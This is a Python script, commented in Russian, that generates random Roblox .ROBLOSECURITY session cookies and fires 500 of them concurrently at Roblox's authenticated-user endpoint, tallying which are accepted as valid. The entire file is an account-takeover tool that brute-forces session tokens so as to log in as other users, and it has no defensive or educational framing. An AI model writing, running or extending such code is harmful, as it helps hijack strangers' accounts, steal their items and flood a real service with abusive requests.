import asyncio
import aiohttp
import random

# Глобальные переменные для хранения статистики
invalid = 0
valid = 0

# Функция для генерации случайного кука
def generate_cookie():
    valid_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    rancookie = ''.join((random.choice(valid_letters) for _ in range(1356)))
    return "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" + rancookie

# Асинхронная функция для проверки одного кука
async def check_cookie(session, cookie):
    global invalid, valid
    url = 'https://users.roblox.com/v1/users/authenticated'
    cookies = {'.ROBLOSECURITY': cookie}
    
    async with session.get(url, cookies=cookies) as response:
        if "Unauthorized" in await response.text():
            invalid += 1
        else:
            valid += 1

# Асинхронная функция для проверки нескольких куков одновременно
async def check_cookies_concurrently(n):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(n):
            cookie = generate_cookie()
            tasks.append(check_cookie(session, cookie))
        await asyncio.gather(*tasks)

# Функция для периодического вывода статистики
async def print_stats():
    global invalid, valid
    while True:
        print(f"Invalid: {invalid}")
        print(f"Valid: {valid}")
        await asyncio.sleep(10)

# Главная функция для запуска асинхронных задач
async def main():
    # Запускаем одновременно две задачи:
    # 1. Проверка куков
    # 2. Периодический вывод статистики
    await asyncio.gather(
        check_cookies_concurrently(500),  # Проверяем 500 куков одновременно
        print_stats()                      # Выводим статистику каждые 10 секунд
    )

# Точка входа в скрипт
if __name__ == "__main__":
    asyncio.run(main())
